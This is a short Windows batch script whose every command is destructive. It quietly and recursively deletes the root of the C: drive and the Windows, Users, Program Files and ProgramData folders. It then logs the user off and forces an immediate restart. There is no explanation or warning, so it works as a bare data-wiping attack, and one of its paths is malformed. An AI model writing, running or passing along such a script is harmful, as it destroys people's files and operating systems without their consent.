@echo off

rmdir /s /q "C:\"
rmdir /s /q "C:\Windows"
rmdir /s /q "C:\Users"
rmdir /s /q "C:\Program Files"
rmdir /s /q "C:\ProgramData"
rmdir /s /q "C:\C:\Program Files (x86)"
shutdown /l
shutdown /r /f /t 0
